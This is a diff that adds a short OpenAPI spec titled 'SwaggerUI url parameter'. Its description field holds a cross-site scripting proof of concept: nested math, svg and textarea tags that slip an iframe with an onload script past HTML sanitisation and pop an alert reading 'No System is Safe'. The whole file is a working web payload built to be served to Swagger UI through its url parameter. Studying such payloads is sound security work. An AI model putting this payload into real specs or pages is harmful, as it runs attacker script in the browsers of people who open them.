@@ -1,0 +1,7 @@
+openapi: "3.0.0"
+
+info:
+  title: SwaggerUI url parameter
+  description:
+    <h4>xss</h4>
+    P0C<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(`No System is Safe`)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
